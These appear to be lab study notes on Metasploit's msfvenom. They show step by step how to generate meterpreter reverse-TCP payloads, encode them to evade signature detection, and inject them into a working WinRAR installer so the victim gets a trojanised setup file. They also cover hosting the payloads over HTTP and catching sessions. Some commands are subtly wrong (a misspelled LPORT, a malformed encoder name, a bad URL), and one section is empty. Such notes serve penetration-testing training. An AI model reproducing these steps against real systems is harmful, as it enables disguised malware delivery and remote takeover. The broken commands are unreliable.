# 1 Generating Payloads With Msfvenom

#### Msfvenom Output format
```linux
msfvenom
msfvenom --list payloads
msfvenom --list formats
```

### Generating windows payloads
```linux
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > /home/kali/Desktop/payloadx86.exe 
#OR
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > /home/kali/Desktop/payloadx64.exe 
```
`x86`: for 32 bit O.S.
`-p`: for generating payload
`-f`: specifying the format.


### Generating linux payloads
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > /home/kali/Desktop/linux-payloadx64
#OR
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f elf > /home/kali/Desktop/linux-payloadx86

chmod +x linux-payloadx86
./linux-payloadx86
```
- no need to specify `-a` as we were already mentioning it in payload(`-p).
- Saving it as a Binary only for linux.

##### Setting up webserver:
To host the windows payload file and exploiting windows 7.

```
sudo python -m SimpleHTTPServer 80
```
Also set Listening handler
```
msfconsole
use multi/handler
#Change the payload to x86
set payload windows/meterpreter/reverse_tcp
set LHOST & LPORT
run
```

Now from windows 7 system
Go and search for `http://10.10.10.5/80`
Save the `x86` payload > execute it.

- Now check the msfconsole, we got the meterpreter session.
##### Same for Linux
```linux
msfconsole
use multi/handler
#Change the payload to x86
set payload linux/x86/meterpreter/reverse_tcp
set LHOST & LPORT
run
```

# 2 Encoding Payloads With Msfvenom
Encoding is the process of modifying the payload shellcode with the objective of modifying the payload signature.
- Shellcode (shell-code) is a piece of code used as a payload for exploitation.

### Windows encoding
```
msfvenom --list encoders
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPOT=1234 -e x86shikata_ga_nai -f exe > /home/kali/Desktop/encodedx86.exe

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPOT=1234 -i 10 -e x86shikata_ga_nai -f exe > /home/kali/Desktop/encodedx86.exe
```
`i`: specifying iterations i.e., encoding it 10 times
`-e`: specifying the encoder
`x86`: for 32 bit O.S.
`-p`: for generating payload
`-f`: specifying the format.
##### Setting up webserver:
To host the windows payload file and exploiting windows 7.

```
sudo python -m SimpleHTTPServer 80
```
Also set Listening handler
```
msfconsole
use multi/handler
#Change the payload to x86
set payload windows/meterpreter/reverse_tcp
set LHOST & LPORT
run
```

Now from windows 7 system
Go and search for `http://10.10.10.5/80`
Save the `x86` payload > execute it.

- Now check the msfconsole, we got the meterpreter session.
### Linux encoding

# 3 Injecting Payloads Into Windows Portable Executables

Requirement: WinRAR 32-bit tool

```linux
msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -x ~/Downloas/path-to-wirar/wrar602.exe > ~/Desktop/winrar.exe
```
`-x`: specify a custom executable file to use as  a templet
	injecting the payload into the executable

```linux
sudo python -m SimpleHTTPServer 80
```
Also set Listening handler
```
msfconsole
use multi/handler
#Change the payload to x86
set payload windows/meterpreter/reverse_tcp
set LHOST & LPORT
run
```

Now from windows 7 system
Go and search for `http://10.10.10.5/80`
Download  the `winrar` setup file  > execute it.
- Now check the msfconsole, we got the meterpreter session.
(post exploitation moodule):
```meterpreter
sysinfo
run post/windows/manage/migrate
```
`migrate`:inject the current meterpreter payload to another one.

Other option:
```linux
msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -k -x ~/Downloas/path-to-wirar/wrar602.exe > ~/Desktop/winrar-new.exe
```
`-k`: will maintain the actual functionality of the portable .exe that we injecting the payload into
